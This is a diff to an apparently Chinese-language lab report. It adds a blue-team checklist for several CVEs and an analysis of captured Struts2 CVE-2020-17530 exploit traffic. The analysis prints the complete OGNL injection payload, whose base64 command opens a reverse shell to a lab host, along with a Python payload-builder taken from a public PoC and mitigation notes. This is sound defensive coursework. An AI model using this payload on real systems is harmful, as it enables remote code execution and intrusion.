@@ -26,6 +26,48 @@
 
 ### As Team Blue
 
+- struts2 代码执行 （CVE-2020-17530）
+
+  - 威胁监测
+
+    - [ ] 漏洞利用持续监测
+
+    - [x] 威胁识别和报告
+
+  - 威胁处置
+
+    - [x] 漏洞利用缓解
+
+    - [ ] 漏洞修复
+
+- weblogic 远程代码执行 (CVE-2019-2725)
+
+  - 威胁监测
+
+    - [ ] 漏洞利用持续监测
+
+    - [ ] 威胁识别和报告
+
+  - 威胁处置
+
+    - [ ] 漏洞利用缓解
+
+    - [ ] 漏洞修复
+
+- 不知名的Nginx命令执行漏洞
+
+  - 威胁监测
+
+    - [ ] 漏洞利用持续监测
+
+    - [ ] 威胁识别和报告
+
+  - 威胁处置
+
+    - [ ] 漏洞利用缓解
+
+    - [ ] 漏洞修复
+
 ## 实验环境
 
 ### 环境List
@@ -834,6 +876,26 @@ msf6 auxiliary(scanner/portscan/tcp) >
 至此，整个DMZ主机环境就算是从外层到中层再到内层都拿下了
 
 ### 蓝方操作
+
+通过参考课件中提供的“即插即用”的tcpdump容器抓包的方式对以红方身份进行漏洞利用时产生的[流量](./pcap/tcpdump.pcap)进行了抓取作为后续蓝方分析的素材
+
+#### struts2
+
+通过一些摸索回想起用HTTP协议直接筛选出exploit部分的流量，随后对其针对应用层的漏洞利用内容进行了记录：
+
+```wireshark
+%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec({"bash -c {echo,YmFzaCAtYyAnMDwmODYtO2V4ZWMgODY8Pi9kZXYvdGNwLzE5Mi4xNjguNTYuMTA3LzQ0NDQ7c2ggPCY4NiA+Jjg2IDI+Jjg2Jw==}|{base64,-d}|bash"}))}
+```
+
+同时和GitHub上对于这一漏洞的一个[POC](https://github.com/CyborgSecurity/CVE-2020-17530/tree/master)内容进行了对比，由于是基于Python配合requests包实现的请求构造，很容易就截取到了逻辑一致的利用操作，在构建payload的函数中：
+
+```python
+#很显然，command就是用户输入的命令了，相比上面Metasploit的exploit，唯一的区别大概是将 #execute.exec()中的内容取出来另拼了一段arglist，看起来更整齐一些
+def build_payload(command):
+   return '%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("' + command + '")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}'
+```
+
+针对这一漏洞的缓解，最直接的办法是升级Apache Struts，直接通过漏洞修复的方式直接修补漏洞，当然也可以通过访问控制的思路来达到缓解的效果，对不可信用户禁用forced OGNL evaluation来阻止非白名单用户基于该漏洞的利用
 
 ## 问题记录
 
